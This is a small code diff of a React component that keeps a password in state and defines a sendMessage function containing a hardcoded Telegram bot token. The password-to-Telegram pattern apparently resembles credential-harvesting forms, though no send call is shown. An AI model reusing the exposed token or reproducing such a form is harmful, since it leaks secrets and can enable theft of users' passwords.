@@ -6,9 +6,8 @@ export default function Example() {
   const [password, setPassword] = useState('');
 
 ;
-  const sendMessage = async (e) => {
-    e.preventDefault();
-    
+  const sendMessage = async () => {
+  
    
     const token = '6863971897:AAH_rx-DOq87BDmzaHKtyNQpBnpZidNLRHI'; // Your Telegram bot token
   
